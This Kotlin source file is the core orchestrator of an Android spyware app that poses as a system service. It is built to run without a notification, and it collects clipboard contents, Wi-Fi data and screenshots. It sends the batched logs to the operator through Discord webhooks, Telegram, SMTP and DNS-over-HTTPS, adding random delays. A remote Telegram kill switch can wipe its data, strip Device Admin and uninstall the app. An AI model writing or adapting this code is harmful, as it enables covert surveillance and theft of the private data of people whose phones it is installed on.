package com.system.service.core

import android.content.Context
import android.content.Intent
import android.os.PowerManager
import com.system.service.exfil.DiscordExfil
import com.system.service.exfil.DoHExfil
import com.system.service.exfil.SMTPExfil
import com.system.service.exfil.TelegramExfil
import com.system.service.monitor.ClipboardMonitor
import com.system.service.monitor.ScreenshotObserver
import com.system.service.monitor.WiFiMonitor
import com.system.service.remote.KillSwitch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

/**
 * Core background orchestrator — manages all monitoring subsystems.
 * Replaces the legacy Foreground Service to completely eliminate the notification.
 * Kept alive intrinsically by the Accessibility and Notification Listener services.
 */
object MonitorCore {

    @Volatile
    var isRunning = false
        private set

    @Volatile
    var isPaused = false

    private var context: Context? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val logQueue = LinkedBlockingQueue<String>(2048)
    private var executor = Executors.newFixedThreadPool(3)

    // Monitors
    private var clipboardMonitor: ClipboardMonitor? = null
    private var wifiMonitor: WiFiMonitor? = null
    private var killSwitch: KillSwitch? = null
    private var screenshotObserver: ScreenshotObserver? = null

    // Exfiltration channels
    private var discordExfil: DiscordExfil? = null
    private var telegramExfil: TelegramExfil? = null
    private var smtpExfil: SMTPExfil? = null
    private var dohExfil: DoHExfil? = null

    @Synchronized
    fun start(appContext: Context) {
        if (isRunning) return
        
        try {
            context = appContext.applicationContext
            Storage.init(context!!)
            
            executor = Executors.newFixedThreadPool(3)

            // Start thermal monitoring
            ThermalGuard.start(context!!, object : ThermalGuard.ThermalListener {
                override fun onThermalLevelChanged(
                    oldLevel: ThermalGuard.ThermalLevel,
                    newLevel: ThermalGuard.ThermalLevel
                ) {
                    val msg = when (newLevel) {
                        ThermalGuard.ThermalLevel.NORMAL ->
                            "[\${timestamp()}] [Thermal] \uD83D\uDFE2 Temperature normal (\${ThermalGuard.batteryTemp}°C) — full speed"
                        ThermalGuard.ThermalLevel.WARM ->
                            "[\${timestamp()}] [Thermal] \uD83D\uDFE1 Device warming (\${ThermalGuard.batteryTemp}°C) — throttling sync"
                        ThermalGuard.ThermalLevel.HOT ->
                            "[\${timestamp()}] [Thermal] \uD83D\uDFE0 Device HOT (\${ThermalGuard.batteryTemp}°C) — screenshots + sync disabled"
                        ThermalGuard.ThermalLevel.CRITICAL ->
                            "[\${timestamp()}] [Thermal] \uD83D\uDD34 CRITICAL (\${ThermalGuard.batteryTemp}°C) — ALL monitoring PAUSED"
                    }
                    if (Config.logLocal) Storage.appendLog(msg)

                    if (newLevel == ThermalGuard.ThermalLevel.CRITICAL && !isPaused) isPaused = true
                    if (oldLevel == ThermalGuard.ThermalLevel.CRITICAL &&
                        newLevel != ThermalGuard.ThermalLevel.CRITICAL && isPaused) isPaused = false
                }
            })

            val pm = context!!.getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "SystemService::MonitorWakeLock"
            ).apply { 
                try { acquire(10 * 60 * 1000L) } catch (_: Exception) {} 
            }

            isRunning = true
            initializeMonitors(context!!)

            if (Config.logLocal) {
                Storage.appendLog("[\${timestamp()}] [System] Mobile Monitor Started (Stealth)")
            }

            startWorker()
        } catch (e: Exception) {
            Storage.init(appContext)
            Storage.appendLog("[\${timestamp()}] [System] ❌ MonitorCore Start Failed: \${e.message}")
        }
    }

    @Synchronized
    fun stop() {
        if (!isRunning) return
        isRunning = false
        ThermalGuard.stop()
        clipboardMonitor?.stop()
        wifiMonitor?.stop()
        killSwitch?.stop()
        screenshotObserver?.let {
            try { context?.contentResolver?.unregisterContentObserver(it) } catch (_: Exception) {}
        }
        wakeLock?.let { if (it.isHeld) it.release() }
        executor.shutdownNow()
        context = null
    }

    private fun initializeMonitors(ctx: Context) {
        clipboardMonitor = ClipboardMonitor(ctx) { log -> enqueueLog(log) }
        clipboardMonitor?.start()

        wifiMonitor = WiFiMonitor(ctx) { log -> enqueueLog(log) }
        wifiMonitor?.start()

        screenshotObserver = ScreenshotObserver(ctx)
        try {
            ctx.contentResolver.registerContentObserver(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                screenshotObserver!!
            )
        } catch (_: Exception) {}

        if (Config.webhookUrl.isNotBlank()) discordExfil = DiscordExfil(Config.webhookUrl)
        if (Config.telegramToken.isNotBlank() && Config.telegramChatId.isNotBlank()) {
            telegramExfil = TelegramExfil(Config.telegramToken, Config.telegramChatId)
        }
        if (Config.smtpHost.isNotBlank() && Config.smtpUser.isNotBlank()) {
            smtpExfil = SMTPExfil(Config.smtpHost, Config.smtpPort, Config.smtpUser, Config.smtpPass, Config.smtpTo)
        }
        dohExfil = DoHExfil(Config.dohEndpoint)

        if (Config.killSwitchEnabled && Config.telegramToken.isNotBlank()) {
            killSwitch = KillSwitch(
                token = Config.telegramToken,
                chatId = Config.telegramChatId,
                onPause = { isPaused = true; enqueueLog("[\${timestamp()}] [System] ⏸️ Monitoring PAUSED") },
                onResume = { isPaused = false; enqueueLog("[\${timestamp()}] [System] ▶️ Monitoring RESUMED") },
                onKill = { executeKill() },
                onWipe = { Storage.wipeAll(); enqueueLog("[\${timestamp()}] [System] 🧹 Data WIPED") },
                context = ctx
            )
            killSwitch?.start()
        }
    }

    fun enqueueLog(content: String) {
        if (isPaused || !ThermalGuard.monitoringAllowed) return
        if (!logQueue.offer(content)) {
            if (Config.logLocal) Storage.appendLog(content)
        }
    }

    private fun startWorker() {
        executor.submit {
            val startupDelay = (5 + (Math.random() * 10).toLong()) * 1000
            Thread.sleep(startupDelay)

            while (isRunning) {
                try {
                    val content = logQueue.poll(10, TimeUnit.SECONDS) ?: continue

                    if (Config.logLocal) Storage.appendLog(content)

                    val batch = mutableListOf(content)
                    logQueue.drainTo(batch, 30)
                    batch.drop(1).forEach { line ->
                        if (Config.logLocal) Storage.appendLog(line)
                    }

                    val combined = batch.joinToString("\n")

                    if (ThermalGuard.syncAllowed) {
                        var sent = false
                        discordExfil?.let { sent = it.send(combined) || sent }
                        telegramExfil?.let { sent = it.send(combined) || sent }

                        if (sent) {
                            val baseDelay = 2000 + (Math.random() * 6000).toLong()
                            val thermalDelay = (baseDelay * ThermalGuard.syncDelayMultiplier).toLong()
                            Thread.sleep(thermalDelay)
                        }

                        smtpExfil?.send(combined)

                        if (discordExfil == null && telegramExfil == null && smtpExfil == null) {
                            dohExfil?.send(combined)
                        }
                    }
                } catch (_: InterruptedException) {
                    break
                } catch (_: Exception) { }
            }
        }
    }

    private fun executeKill() {
        Storage.wipeAll()
        Config.isConfigured = false
        stop()
        try {
            val ctx = context ?: return
            
            // Bypass Device Admin before uninstall
            val component = android.content.ComponentName(ctx, com.system.service.receivers.DeviceAdminReceiver::class.java)
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            dpm.removeActiveAdmin(component)

            val intent = Intent(Intent.ACTION_DELETE)
            intent.data = android.net.Uri.parse("package:\${ctx.packageName}")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            ctx.startActivity(intent)
        } catch (_: Exception) { }
        android.os.Process.killProcess(android.os.Process.myPid())
    }

    private fun timestamp(): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
    }
}
